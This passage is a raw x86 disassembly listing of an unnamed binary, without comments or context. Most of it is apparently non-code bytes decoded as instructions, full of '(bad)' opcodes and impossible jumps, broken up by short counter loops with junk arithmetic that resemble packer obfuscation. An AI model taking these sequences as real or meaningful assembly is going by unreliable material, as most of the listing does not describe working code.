  419755:	mov    DWORD PTR [ebp-0x1c],ecx
  419758:	imul   edx,eax
  41975b:	xor    edi,DWORD PTR ds:0x42a821
  419761:	mov    ecx,0x4573
  419766:	add    edx,ecx
  419768:	sub    DWORD PTR ds:0x42a89d,ecx
  41976e:	mov    esi,0x7879
  419773:	mov    edi,0x1556
  419778:	not    DWORD PTR ds:0x42a865
  41977e:	xchg   esi,ecx
  419780:	add    DWORD PTR ds:0x42a7d5,0x585c
  41978a:	jmp    0x4199bf
  41978f:	iret   
  419790:	iret   
  419791:	(bad)  
  419792:	xlat   BYTE PTR ds:[ebx]
  419793:	(bad)  
  419794:	xlat   BYTE PTR ds:[ebx]
  419795:	iret   
  419796:	xlat   BYTE PTR ds:[ebx]
  419797:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419798:	call   0x6411ddeb
  41979d:	out    dx,al
  41979e:	mov    edi,DWORD PTR [eax]
  4197a0:	leave  
  4197a1:	jg     0x41981b
  4197a3:	adc    BYTE PTR [esi+0x78],bh
  4197a6:	js     0x4197f3
  4197a8:	aad    0x70
  4197aa:	mov    ecx,ebx
  4197ac:	sub    ch,bh
  4197ae:	into   
  4197af:	test   al,0x3e
  4197b1:	(bad)  
  4197b2:	iret   
  4197b3:	inc    ebx
  4197b4:	mov    esi,0x2b54d4e6
  4197b9:	rol    DWORD PTR [ebp+0x3d0d0fe0],cl
  4197bf:	inc    ebx
  4197c0:	(bad)  
  4197c1:	push   edi
  4197c2:	aas    
  4197c3:	xchg   edi,eax
  4197c4:	mov    bl,0x81
  4197c6:	inc    eax
  4197c7:	out    dx,al
  4197c8:	hlt    
  4197c9:	(bad)  
  4197ca:	in     al,0x7
  4197cc:	test   al,0x92
  4197ce:	fsubp  st(6),st
  4197d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4197d1:	jg     0x419783
  4197d3:	jb     0x4197d8
  4197d5:	mov    ebp,0xb0ee4daa
  4197da:	sbb    al,ch
  4197dc:	xor    bh,al
  4197de:	sbb    eax,0x43ebd812
  4197e3:	pop    esp
  4197e4:	aas    
  4197e5:	(bad)  
  4197e7:	repnz add DWORD PTR [edi-0x64],ebp
  4197eb:	lea    ebx,[eax-0x73]
  4197ee:	add    eax,0x95289401
  4197f3:	mov    eax,DWORD PTR [eax+0x11]
  4197f6:	(bad)  
  4197f7:	xlat   BYTE PTR ds:[ebx]
  4197f8:	adc    DWORD PTR [eax+ebp*2+0x4fb86831],edi
  4197ff:	inc    edi
  419800:	sub    eax,0xeb977524
  419805:	(bad)  
  419806:	fidiv  WORD PTR [ebx+edx*2]
  419809:	dec    edi
  41980a:	idiv   BYTE PTR [edx]
  41980c:	sahf   
  41980d:	les    ecx,FWORD PTR ds:0x73ea3581
  419813:	xor    ebp,edi
  419815:	mov    edx,0x9c326419
  41981a:	leave  
  41981b:	outs   dx,DWORD PTR ds:[esi]
  41981c:	fadd   DWORD PTR [ebp+0x13]
  41981f:	mov    esi,0x7ded004b
  419824:	stc    
  419825:	out    dx,al
  419826:	xchg   ebx,eax
  419827:	bound  ebp,QWORD PTR [ebx-0xff71726]
  41982d:	loopne 0x4197bd
  41982f:	jmp    0x419863
  419831:	in     eax,dx
  419832:	mov    dl,0xa2
  419834:	icebp  
  419835:	shr    bh,cl
  419837:	dec    edi
  419838:	mov    eax,ds:0xc0a8055d
  41983d:	ror    DWORD PTR [ebp+0x40],0xb6
  419841:	fstp   DWORD PTR [edi+0x6052120c]
  419847:	leave  
  419848:	xchg   ecx,eax
  419849:	sbb    eax,0x68f6af47
  41984e:	pop    ss
  41984f:	inc    ebp
  419850:	pop    ds
  419851:	mov    esp,ss
  419853:	outs   dx,DWORD PTR ds:[esi]
  419854:	xchg   esi,eax
  419855:	ja     0x4198cd
  419857:	ret    
  419858:	xchg   esp,eax
  419859:	xor    dh,BYTE PTR [ebp+0x39]
  41985c:	jns    0x41984d
  41985e:	adc    al,0xec
  419861:	(bad)  
  419862:	stc    
  419863:	sub    eax,0xe5e37d2d
  419868:	push   esp
  419869:	and    esp,0x60
  41986c:	cmp    DWORD PTR [eax+0xf],esp
  41986f:	mov    esp,0x66c075c6
  419874:	xor    edi,esi
  419876:	mov    DWORD PTR [eax-0x7060c0da],edi
  41987c:	nop
  41987d:	mov    bl,0x1e
  41987f:	add    BYTE PTR [ebx-0x3db90f5],cl
  419885:	inc    ecx
  419886:	pop    ds
  419887:	enter  0x6d79,0xda
  41988b:	xor    BYTE PTR [ecx+0x37],cl
  41988e:	adc    eax,0xed5a67f4
  419893:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419894:	lock lods eax,DWORD PTR ds:[esi]
  419896:	imul   edx,DWORD PTR [eax-0x3e],0xfffffff3
  41989a:	dec    esp
  41989b:	rcr    DWORD PTR [ecx],1
  41989d:	cs jp  0x419849
  4198a0:	call   FWORD PTR [ecx+edx*4]
  4198a3:	jnp    0x4198d5
  4198a5:	jp     0x41988d
  4198a7:	fstp   TBYTE PTR [ebp+eax*2+0x33]
  4198ab:	mov    BYTE PTR [ecx-0x80],ch
  4198ae:	adc    dh,ch
  4198b0:	shl    DWORD PTR [ebx],0xde
  4198b3:	jns    0x4198a9
  4198b5:	not    eax
  4198b7:	xchg   ebp,eax
  4198b8:	in     al,dx
  4198b9:	daa    
  4198ba:	mov    dl,0x4
  4198bc:	jl     0x419890
  4198be:	dec    esp
  4198bf:	pop    edi
  4198c0:	cli    
  4198c1:	jo     0x41991c
  4198c3:	mov    esp,0x126c0c6e
  4198c8:	sub    eax,0x643945cb
  4198cd:	or     ebx,DWORD PTR [edx]
  4198cf:	push   esp
  4198d0:	inc    edx
  4198d1:	loop   0x41991c
  4198d3:	sar    BYTE PTR [edx+0x11],1
  4198d6:	cli    
  4198d7:	sti    
  4198d8:	sub    esi,0xc77c3610
  4198de:	add    eax,0xc143e48c
  4198e3:	popa   
  4198e4:	pop    ebx
  4198e5:	xchg   edx,eax
  4198e6:	mov    ebp,DWORD PTR [eax+0x3c]
  4198e9:	cmp    DWORD PTR [eax-0x7b],0x1e
  4198ed:	ror    BYTE PTR [ecx+0x17],1
  4198f0:	adc    ebp,DWORD PTR [eax]
  4198f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4198f3:	xor    eax,0x870fb620
  4198f8:	stc    
  4198f9:	adc    eax,0xbd6f0594
  4198fe:	iret   
  4198ff:	imul   edi,DWORD PTR [edx-0x32a939a0],0x26
  419906:	retf   
  419907:	lds    edi,FWORD PTR [eax+0x73]
  41990a:	jns    0x419981
  41990c:	inc    edi
  41990d:	fimul  WORD PTR ds:0x4f206c49
  419913:	int3   
  419914:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419915:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419916:	or     BYTE PTR [ebx],cl
  419918:	push   0xa82bf84d
  41991d:	mov    ebp,0xaf80cfcb
  419922:	jno    0x419940
  419924:	sahf   
  419925:	lods   al,BYTE PTR ds:[esi]
  419926:	push   ds
  419927:	or     ecx,DWORD PTR [ebx-0x3e]
  41992a:	add    DWORD PTR [edi-0x5c],eax
  41992d:	rcl    BYTE PTR [edx+eax*8-0x6202c2e4],1
  419934:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419935:	cld    
  419936:	pop    esp
  419937:	mov    ch,0x2a
  419939:	xchg   ebx,eax
  41993a:	mov    al,ds:0x5d5b39a1
  41993f:	shr    DWORD PTR [ebx+0x24],cl
  419942:	mov    es,WORD PTR [eax]
  419944:	push   eax
  419945:	sbb    DWORD PTR [eax+0x3f5642fd],ebp
  41994b:	push   edi
  41994c:	xchg   DWORD PTR [ecx],ebp
  41994e:	add    BYTE PTR [edx],0x73
  419951:	push   ds
  419952:	jg     0x419904
  419954:	outs   dx,DWORD PTR ds:[esi]
  419955:	cmp    al,0xb5
  419957:	cmp    bl,dh
  419959:	fsubr  QWORD PTR [ebx+0x3bf5da0b]
  41995f:	cmp    al,0x8b
  419961:	repz daa 
  419963:	rol    bl,1
  419965:	xchg   ecx,eax
  419966:	cs adc al,0xc
  419969:	or     ecx,ebx
  41996b:	xor    DWORD PTR [eax+0x30],edi
  41996e:	jle    0x419918
  419970:	dec    esp
  419971:	push   0x2a
  419973:	push   edx
  419974:	cmp    BYTE PTR [esi],cl
  419976:	test   DWORD PTR [bp+di],0x18db97d
  41997d:	in     eax,0xe7
  41997f:	rol    BYTE PTR [ecx-0x1f],cl
  419982:	out    0xf5,al
  419984:	cmp    al,0xcc
  419986:	push   0x48
  419988:	pop    ecx
  419989:	inc    esi
  41998a:	jge    0x41994d
  41998c:	dec    edx
  41998d:	out    0xc4,eax
  41998f:	mov    esi,0xf76afd69
  419994:	test   ebp,esi
  419996:	loope  0x41994c
  419998:	sahf   
  419999:	popa   
  41999a:	fimul  WORD PTR [eax+0x20805224]
  4199a0:	jo     0x4199e7
  4199a2:	call   0xab86:0x69c1853
  4199a9:	cmp    eax,0x69f46aec
  4199ae:	push   edi
  4199af:	addr16 in eax,0x32
  4199b2:	jne    0x419a22
  4199b4:	and    BYTE PTR [ebx+ebx*8+0x8],dl
  4199b8:	sub    ebx,esp
  4199ba:	jecxz  0x419980
  4199bc:	xchg   esp,eax
  4199bd:	lods   eax,DWORD PTR ds:[esi]
  4199be:	add    ebp,DWORD PTR [ebx]
  4199c0:	xlat   BYTE PTR ds:[ebx]
  4199c1:	adc    ecx,0x1fe4
  4199c7:	xor    esi,esi
  4199c9:	xor    DWORD PTR ds:0x42a82d,0x2675
  4199d3:	mov    DWORD PTR [ebp-0x28],esi
  4199d6:	mov    DWORD PTR ds:0x42a8a1,0x12
  4199e0:	cmp    DWORD PTR ds:0x42a8a1,0x0
  4199e7:	je     0x419a88
  4199ed:	cmp    DWORD PTR ds:0x42a8a1,0x16
  4199f4:	jne    0x419a15
  4199fa:	push   0x8ec2
  4199ff:	push   DWORD PTR [ebp-0x24]
  419a02:	push   0x4fb2
  419a07:	push   0x17f0
  419a0c:	push   DWORD PTR [ebp-0x20]
  419a0f:	call   DWORD PTR ds:0x41d11c
  419a15:	mov    ecx,DWORD PTR ds:0x42a8a1
  419a1b:	dec    ecx
  419a1c:	mov    DWORD PTR ds:0x42a8a1,ecx
  419a22:	jmp    0x4199e0
  419a27:	mov    DWORD PTR ds:0x42a785,0x1b
  419a31:	cmp    DWORD PTR ds:0x42a785,0x0
  419a38:	je     0x419a88
  419a3e:	cmp    DWORD PTR ds:0x42a785,0x5
  419a45:	jne    0x419a54
  419a4b:	push   DWORD PTR [ebp-0x14]
  419a4e:	call   DWORD PTR ds:0x41d1fc
  419a54:	cmp    DWORD PTR ds:0x42a785,0x6
  419a5b:	jne    0x419a6e
  419a61:	mov    ecx,DWORD PTR ds:0x42a785
  419a67:	dec    ecx
  419a68:	mov    DWORD PTR ds:0x42a785,ecx
  419a6e:	xor    ecx,ecx
  419a70:	or     ecx,DWORD PTR ds:0x42a785
  419a76:	dec    ecx
  419a77:	mov    DWORD PTR ds:0x42a785,ecx
  419a7d:	jmp    0x419a31
  419a82:	adc    DWORD PTR ds:0x42a825,ebx
  419a88:	mov    DWORD PTR [ebp-0x2c],esi
  419a8b:	and    DWORD PTR ds:0x42a869,ecx
  419a91:	mov    DWORD PTR [ebp-0x14],esi
  419a94:	add    ecx,DWORD PTR ds:0x42a7d5
  419a9a:	mov    DWORD PTR [ebp-0x8],esi
  419a9d:	mov    ecx,DWORD PTR [ebp-0x18]
  419aa0:	adc    DWORD PTR ds:0x42a85d,0x42a7d1
  419aaa:	xor    ecx,eax
  419aac:	xor    edi,edi
  419aae:	and    DWORD PTR ds:0x42a8a1,0x0
  419ab8:	jmp    0x419ac8
  419abd:	mov    eax,ds:0x42a8a1
  419ac2:	inc    eax
  419ac3:	mov    ds:0x42a8a1,eax
  419ac8:	cmp    DWORD PTR ds:0x42a8a1,0x1c
  419acf:	jae    0x419af8
  419ad5:	cmp    DWORD PTR ds:0x42a8a1,0x1e
  419adc:	jne    0x419aed
  419ae2:	push   0x42a825
  419ae7:	call   DWORD PTR ds:0x41d120
  419aed:	jmp    0x419abd
  419af2:	adc    eax,DWORD PTR ds:0x42a7ed
  419af8:	add    ecx,ebx
  419afa:	mov    DWORD PTR [ebp-0x20],ecx
  419afd:	mov    eax,ds:0x42a865
  419b02:	jmp    0x419d37
  419b07:	cmp    eax,0xcbcec3c5
  419b0c:	fcmovbe st,st(1)
  419b0e:	aad    0x68
  419b10:	xor    DWORD PTR [ecx+0xd],0xffffffde
  419b14:	pop    ecx
  419b15:	mov    al,ds:0x7fcfd087
  419b1a:	js     0x419b2c
  419b1c:	jle    0x419b96
  419b1e:	js     0x419b8d
  419b20:	loop   0x419b71
  419b22:	sbb    BYTE PTR [ecx],bl
  419b24:	sbb    DWORD PTR [esi-0x640755ce],esp
  419b2a:	fst    st(4)
  419b2c:	mov    dl,BYTE PTR fs:[eax-0x3abe0957]
  419b33:	mov    edi,0xd35b2166
  419b38:	push   ecx
  419b39:	push   0xfffffff8
  419b3b:	aaa    
  419b3c:	shl    DWORD PTR ds:0xbd002d2e,1
  419b42:	or     cl,BYTE PTR [ecx+0x2954855d]
  419b48:	repz shl esi,cl
  419b4b:	mov    WORD PTR fs:[esi],?
  419b4e:	cmp    ecx,DWORD PTR [edx+0xc]
  419b51:	inc    edx
  419b52:	pop    ss
  419b53:	sbb    eax,0x1b79131
  419b58:	push   ecx
  419b59:	xor    al,0x5f
  419b5b:	dec    edx
  419b5c:	and    BYTE PTR [edx-0x363582f9],bl
  419b62:	cmp    BYTE PTR [ecx+0x3b],al
  419b65:	les    ebx,FWORD PTR [eax+0x49]
  419b68:	xchg   edx,eax
  419b69:	jge    0x419b42
  419b6b:	or     edi,esi
  419b6d:	push   esi
  419b6e:	imul   ebx,DWORD PTR ds:0xf42671cf,0xffffffd3
  419b75:	scas   eax,DWORD PTR es:[edi]
  419b76:	xchg   DWORD PTR [edx+0x7d],ebp
  419b79:	into   
  419b7a:	cs sub al,0x9a
  419b7d:	pop    edx
  419b7e:	cmp    al,0xb9
  419b80:	ss jno 0x63d30a84
  419b87:	jns    0x419bb8
  419b89:	mov    cl,0x87
  419b8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419b8c:	int    0xcd
  419b8e:	iret   
  419b8f:	jmp    0xc23b6265
  419b94:	push   edx
  419b95:	xchg   ebp,eax
  419b96:	push   ebx
  419b97:	and    edi,esp
  419b99:	mov    bh,cl
  419b9b:	outs   dx,BYTE PTR ds:[esi]
  419b9c:	loopne 0x419b87
  419b9e:	pop    ebx
  419b9f:	pop    ebp
  419ba0:	sbb    al,0x15
  419ba2:	test   al,0xaa
  419ba4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ba5:	fisub  DWORD PTR [esi+0x6b]
  419ba8:	add    bh,BYTE PTR [eax+0x761b5d34]
  419bae:	lahf   
  419baf:	out    0x80,al
  419bb1:	push   0x2a
  419bb3:	adc    eax,0xfe358a5c
  419bb8:	sbb    DWORD PTR [eax-0x7f],0x365a0776
  419bbf:	jne    0x419c31
  419bc1:	gs push esi
  419bc3:	pop    edi
  419bc4:	data16 arpl bx,bx
  419bc7:	or     bl,BYTE PTR [edx-0x1]
  419bca:	pop    DWORD PTR [esi]
  419bcc:	pop    ds
  419bcd:	jnp    0x419bf3
  419bcf:	mov    ecx,0xa7953113
  419bd4:	cmp    DWORD PTR [ecx-0x6fc5aada],0xffffffd2
  419bdb:	inc    eax
  419bdc:	cli    
  419bdd:	add    BYTE PTR [ebp-0x282dbc2c],ch
  419be3:	jecxz  0x419b70
  419be5:	xor    esi,DWORD PTR [edx+0x4c]
  419be8:	shl    DWORD PTR ds:0x162fe340,1
  419bee:	adc    eax,0xed789fec
  419bf3:	jmp    0x29582e7e
  419bf8:	sub    DWORD PTR [esi+ebx*2],edi
  419bfb:	mov    esi,edi
  419bfd:	fdiv   DWORD PTR [ecx+eiz*2+0x29]
  419c01:	add    esp,DWORD PTR [ebx+0x17]
  419c04:	lahf   
  419c05:	(bad)  
  419c07:	or     ebp,DWORD PTR [ebx+eax*1+0x5a]
  419c0b:	nop
  419c0c:	adc    ebx,ecx
  419c0e:	in     eax,0x8d
  419c10:	aaa    
  419c11:	pop    edx
  419c12:	stc    
  419c13:	fsub   st(7),st
  419c15:	iret   
  419c16:	es and bl,ch
  419c19:	jae    0x419bad
  419c1b:	mov    ?,WORD PTR [ebp+0x3cdb15bf]
  419c21:	rcr    BYTE PTR [eax-0x6424c960],1
  419c27:	fist   DWORD PTR [ebx-0x498cf686]
  419c2d:	push   eax
  419c2e:	in     al,0x6d
  419c30:	(bad)  
  419c31:	into   
  419c32:	ds add al,dl
  419c35:	pop    ds
  419c36:	imul   BYTE PTR [ebx]
  419c38:	imul   esp,DWORD PTR [esi-0x4f],0x56d1e2db
  419c3f:	inc    edi
  419c40:	or     DWORD PTR [ecx+0x36],ecx
  419c43:	nop
  419c44:	data16 mov dh,0x42
  419c47:	mov    ecx,0xf889eb6a
  419c4c:	push   ds
  419c4d:	mov    edi,0x8ef09042
  419c52:	dec    esp
  419c53:	push   es
  419c54:	cmp    esi,DWORD PTR ds:0x46050cc9
  419c5a:	sbb    al,0x8
  419c5c:	push   0x7ef75d75
  419c61:	fsubp  st(4),st
  419c63:	push   ebx
  419c64:	fisubr DWORD PTR [edx+esi*4]
  419c67:	add    ecx,DWORD PTR [ecx+0x6202100e]
  419c6d:	stos   BYTE PTR es:[edi],al
  419c6e:	xchg   esp,eax
  419c6f:	mov    al,BYTE PTR [esi-0x2b2d18f7]
  419c75:	ss add al,0x2b
  419c78:	fdivrp st(2),st
  419c7a:	dec    esi
  419c7b:	inc    ecx
  419c7c:	or     eax,DWORD PTR [edi-0x1e179491]
  419c82:	daa    
  419c83:	and    eax,0xb997a2e5
  419c88:	mov    esi,0xf3ffcf01
  419c8d:	clc    
  419c8e:	cmp    dh,BYTE PTR [ecx]
  419c90:	xchg   DWORD PTR [ebp+0x3ced885b],esi
  419c96:	xchg   ecx,ebp
  419c98:	sahf   
  419c99:	jmp    0x9f5b:0x8b673876
  419ca0:	fwait
  419ca1:	repz out dx,al
  419ca3:	cmp    al,0x4a
  419ca5:	stos   BYTE PTR es:[edi],al
  419ca6:	sbb    edx,DWORD PTR [ebx+0x36]
  419ca9:	stos   DWORD PTR es:[edi],eax
  419caa:	mov    al,ds:0xa2708b3f
  419caf:	pushf  
  419cb0:	cmp    eax,0x3c414398
  419cb5:	jae    0x419ca8
  419cb7:	mov    ebx,0x5ca26e25
  419cbc:	inc    edi
  419cbd:	cmc    
  419cbe:	stc    
  419cbf:	scas   eax,DWORD PTR es:[edi]
  419cc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419cc1:	sbb    BYTE PTR [esi+0x2551f178],al
  419cc7:	mov    cl,BYTE PTR [edi-0x2]
  419cca:	sub    DWORD PTR [ebp+eiz*1-0x275d524e],ebx
  419cd1:	add    ecx,ecx
  419cd3:	retf   
  419cd4:	rol    BYTE PTR [eax-0x46],1
  419cd7:	ret    
  419cd8:	mov    WORD PTR [edx],fs
  419cda:	jno    0x419d3b
  419cdc:	cli    
  419cdd:	retf   0xd40f
  419ce0:	adc    eax,0x4f7f6cde
  419ce5:	add    esp,DWORD PTR [eax]
  419ce7:	cli    
  419ce8:	lahf   
  419ce9:	or     cl,BYTE PTR [ebx-0x4c]
  419cec:	or     al,0xd9
  419cee:	sbb    eax,0x3a6efb9
  419cf3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419cf4:	loop   0x419cf9
  419cf6:	ins    DWORD PTR es:[edi],dx
  419cf7:	sahf   
  419cf8:	icebp  
  419cf9:	cwde   
  419cfa:	hlt    
  419cfb:	adc    DWORD PTR [edi+0x16bb8e84],0x1f
  419d02:	mov    WORD PTR [ebx],cs
  419d04:	(bad)  
  419d05:	jmp    0x419ce6
  419d07:	jl     0x419d17
  419d09:	push   eax
  419d0a:	jmpw   0xbfd9
  419d0e:	loop   0x419d84
  419d10:	aam    0xfc
  419d12:	or     dl,al
  419d14:	or     al,0x99
  419d16:	mov    ch,0x5b
  419d18:	(bad)  
  419d19:	mov    eax,0xfabf6770
  419d1e:	sbb    ah,BYTE PTR [ebp+eiz*4+0x6d80431b]
  419d25:	xor    al,0xfe
  419d27:	push   0xd80aa499
  419d2c:	sub    BYTE PTR [eax],0xe2
  419d2f:	repnz outs dx,BYTE PTR ds:[esi]
  419d31:	jmp    0x419d85
  419d33:	push   ecx
  419d34:	stos   DWORD PTR es:[edi],eax
  419d35:	jmp    0x840f:0xe0458bec
  419d3c:	mov    DWORD PTR [ebx],ecx
  419d3e:	add    BYTE PTR [eax],al
  419d40:	inc    eax
  419d41:	mov    eax,DWORD PTR [ebp-0x4]
  419d44:	xor    eax,0x7510850
  419d49:	sbb    DWORD PTR ds:0x42a859,0x42a78d
  419d53:	add    eax,ebx
  419d55:	mov    DWORD PTR ds:0x42a8a9,0x7077
  419d5f:	cmp    edi,eax
  419d61:	mov    DWORD PTR ds:0x42a85d,0xab2
  419d6b:	jmp    0x419fa0
  419d70:	(bad)  
  419d71:	into   
  419d72:	ror    bh,cl
  419d74:	(bad)  
  419d76:	leave  
  419d77:	(bad)  
  419d78:	push   0xffffffe9
  419d7a:	or     esi,esi
  419d7c:	fisub  DWORD PTR ds:0xcde81efb
  419d82:	jg     0x419dfc
  419d84:	adc    BYTE PTR [esi+0x78],bh
  419d87:	js     0x419dc3
  419d89:	inc    esp
  419d8a:	aas    
  419d8b:	dec    ebx
  419d8c:	hlt    
  419d8d:	leave  
  419d8e:	repz add al,0xb3
  419d91:	pop    ebx
  419d92:	cmp    bh,BYTE PTR [ebp-0x15fda4af]
  419d98:	xchg   edx,eax
  419d99:	fwait
  419d9a:	loop   0x419da2
  419d9c:	push   es
  419d9d:	fisttp DWORD PTR [ecx]
  419d9f:	or     DWORD PTR [ebp-0x545b72bb],edx
  419da5:	mul    DWORD PTR [eax-0x30]
  419da8:	outs   dx,DWORD PTR ds:[esi]
  419da9:	jg     0x419e26
  419dab:	rol    ch,1
  419dad:	cli    
  419dae:	aas    
  419daf:	frstor [eax+eiz*8-0x1b]
  419db3:	jmp    0x419dc5
  419db5:	dec    edi
  419db6:	mov    ds:0xdde860cf,al
  419dbb:	sub    al,0x2e
  419dbd:	call   DWORD PTR [esi-0x220f290a]
  419dc3:	lock mov bh,0xcc
  419dc6:	and    DWORD PTR [ebx],ecx
  419dc8:	xor    edi,DWORD PTR [ecx-0x47e13ac0]
  419dce:	adc    dh,al
  419dd0:	mov    cl,dh
  419dd2:	sub    BYTE PTR [edi-0x77],0x9c
  419dd6:	mov    esi,0x881c20f6
  419ddb:	loopne 0x419dc2
  419ddd:	into   
  419dde:	inc    ebx
  419ddf:	pop    es
  419de0:	pop    esp
  419de1:	push   ecx
  419de2:	arpl   WORD PTR [esi],si
  419de4:	cwde   
  419de5:	sti    
  419de6:	jecxz  0x419db8
  419de8:	xor    dl,BYTE PTR [ecx-0x6f0f2e5b]
  419dee:	jecxz  0x419e4d
  419df0:	stos   DWORD PTR es:[edi],eax
  419df1:	ins    BYTE PTR es:[edi],dx
  419df2:	xor    eax,DWORD PTR [edx+0x5e]
  419df5:	cwde   
  419df6:	retf   
  419df7:	pop    esi
  419df8:	dec    edi
  419df9:	dec    ebx
  419dfa:	out    0xbe,al
  419dfc:	jg     0x419e0a
  419dfe:	or     DWORD PTR [esi],eax
  419e00:	es jo  0x419e5c
  419e03:	outs   dx,DWORD PTR ds:[esi]
  419e04:	mov    eax,0xf0569dbb
  419e09:	xchg   esi,eax
  419e0a:	ja     0x419e80
  419e0c:	out    0x50,eax
  419e0e:	outs   dx,DWORD PTR ds:[esi]
  419e0f:	jmp    0x419db5
  419e11:	popa   
  419e12:	mov    WORD PTR [edx-0x422f2d58],gs
  419e18:	mov    cl,0x85
  419e1a:	adc    BYTE PTR [edi],dl
  419e1c:	fstp   DWORD PTR [edi]
  419e1e:	fimul  DWORD PTR [esi+0x55]
  419e21:	daa    
  419e22:	out    dx,eax
  419e23:	push   ds
  419e24:	mov    DWORD PTR [edx+ebp*8-0x38],esi
  419e28:	int    0xd8
  419e2a:	inc    esi
  419e2b:	bswap  ebx
  419e2d:	repz push es
  419e2f:	add    bl,BYTE PTR [eax]
  419e31:	test   al,0x61
  419e33:	push   ss
  419e34:	pop    ds
  419e35:	retf   
  419e36:	loopne 0x419e69
  419e38:	into   
  419e39:	mov    ?,WORD PTR [esi]
  419e3b:	inc    edx
  419e3c:	pop    esp
  419e3d:	cwde   
  419e3e:	xchg   edi,eax
  419e3f:	es dec ebp
  419e41:	imul   ecx,DWORD PTR [edi],0xffffffa9
  419e44:	cmp    eax,DWORD PTR [ecx-0x1c9721fd]
  419e4a:	sub    DWORD PTR [ebx+0x7dbf26d7],edx
  419e50:	imul   ebx,DWORD PTR [ecx],0xffffffca
  419e53:	(bad)  
  419e54:	int    0x36
  419e56:	aad    0xb9
  419e58:	inc    esi
  419e59:	mov    esi,0x4b798bce
  419e5e:	dec    ebx
  419e5f:	aam    0x80
  419e61:	mov    ds,WORD PTR [eax+0x3edc0091]
  419e67:	xor    BYTE PTR [edi],dh
  419e69:	jbe    0x419e53
  419e6b:	and    al,0x63
  419e6d:	sahf   
  419e6e:	fild   QWORD PTR [ebp+edi*2-0x4d5e97a3]
  419e75:	sbb    ebp,DWORD PTR [ebx+0x5e]
  419e78:	ret    
  419e79:	mov    dl,0x82
  419e7b:	mov    edx,0xd5f1a78d
  419e80:	mov    ebx,0x901b0d15
  419e85:	cld    
  419e86:	jb     0x419eeb
  419e88:	sti    
  419e89:	add    DWORD PTR [ebx-0x35],ebp
  419e8c:	jl     0x419e20
  419e8e:	enter  0x6c31,0x20
  419e92:	sbb    al,0xb8
  419e94:	pushf  
  419e95:	cmp    esp,DWORD PTR [ebp+0x1f]
  419e98:	jnp    0x419f0c
  419e9a:	xchg   BYTE PTR [edi],cl
  419e9c:	cmp    DWORD PTR [esi+ebp*4+0x439f8c6],edx
  419ea3:	mov    DWORD PTR [esi],ebp
  419ea5:	test   eax,0x62b42326
  419eaa:	(bad)  
  419eac:	push   ss
  419ead:	out    dx,al
  419eae:	pusha  
  419eaf:	sti    
  419eb0:	sbb    DWORD PTR [edi-0x4a],esp
  419eb3:	push   edx
  419eb4:	pop    esi
  419eb5:	aad    0x23
  419eb7:	pop    ss
  419eb8:	ins    BYTE PTR es:[edi],dx
  419eb9:	pop    ecx
  419eba:	and    eax,0x67f8d108
  419ebf:	fidivr DWORD PTR [edx+0x73ce58bc]
  419ec5:	out    dx,eax
  419ec6:	lahf   
  419ec7:	jnp    0x419e61
  419ec9:	adc    dl,BYTE PTR [ebp+0x63]
  419ecc:	and    eax,0x8a136477
  419ed1:	sub    al,0x23
  419ed3:	xor    al,0x2a
  419ed5:	lahf   
  419ed6:	jle    0x419edd
  419ed8:	(bad)  
  419ed9:	xchg   ebx,eax
  419eda:	fld    TBYTE PTR [ebx-0x3e4fa762]
  419ee0:	retf   0x23b8
  419ee3:	jmp    0x2f01:0x4dc3dacb
  419eea:	loope  0x419e8e
  419eec:	(bad)  
  419eed:	or     esi,0x73
  419ef0:	mov    edx,0x476be073
  419ef5:	pop    ss
  419ef6:	mov    ah,0x3
  419ef8:	pop    edx
  419ef9:	int    0x31
  419efb:	ja     0x419ed8
  419efd:	outs   dx,DWORD PTR ds:[esi]
  419efe:	push   ds
  419eff:	out    dx,al
  419f00:	jbe    0x419f6f
  419f02:	fdiv   DWORD PTR [eax+esi*8+0x4c]
  419f06:	sbb    al,0xfe
  419f08:	test   eax,0xb79512df
  419f0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f0e:	mov    ah,0xde
  419f10:	das    
  419f11:	fcom   DWORD PTR [ebp+0x7b47f79e]
  419f17:	inc    ebp
  419f18:	jl     0x419efd
  419f1a:	outs   dx,DWORD PTR ds:[esi]
  419f1b:	lods   eax,DWORD PTR ds:[esi]
  419f1c:	fadd   QWORD PTR [edi-0x67]
  419f1f:	outs   dx,DWORD PTR ds:[esi]
  419f20:	jecxz  0x419f9c
  419f22:	or     eax,0xd7a74521
  419f27:	and    al,0x5
  419f29:	stos   BYTE PTR es:[edi],al
  419f2a:	pop    edi
  419f2b:	scas   eax,DWORD PTR es:[edi]
  419f2c:	jo     0x419f27
  419f2e:	xchg   esp,eax
  419f2f:	aam    0x47
  419f31:	outs   dx,BYTE PTR ds:[esi]
  419f32:	ja     0x419f9b
  419f34:	es or  eax,0xe2cfdacd
  419f3a:	pusha  
  419f3b:	ja     0x419f73
  419f3d:	add    al,0x36
  419f3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f40:	cmp    esi,DWORD PTR [edx]
  419f42:	adc    DWORD PTR [esi-0x13],edi
  419f45:	sbb    DWORD PTR [ecx],0xffffff97
  419f48:	loope  0x419ef4
  419f4a:	sahf   
  419f4b:	clc    
  419f4c:	or     dh,BYTE PTR [ebp+0x425ccb44]
  419f52:	sbb    al,0x7b
  419f54:	ins    DWORD PTR es:[edi],dx
  419f55:	fwait
  419f56:	sub    eax,0x2f539713
  419f5b:	(bad)  
  419f5c:	test   eax,0x1e7c44a1
  419f61:	fs or  al,0x6
  419f64:	mov    ah,0x1d
  419f66:	add    ah,dh
  419f68:	push   ds
  419f69:	push   esp
  419f6a:	sbb    esp,ebx
  419f6c:	dec    ebp
  419f6d:	or     cl,BYTE PTR [eax-0x71fe80bb]
  419f73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f74:	cmp    al,0xb8
  419f76:	rcr    BYTE PTR [eax],cl
  419f78:	push   cs
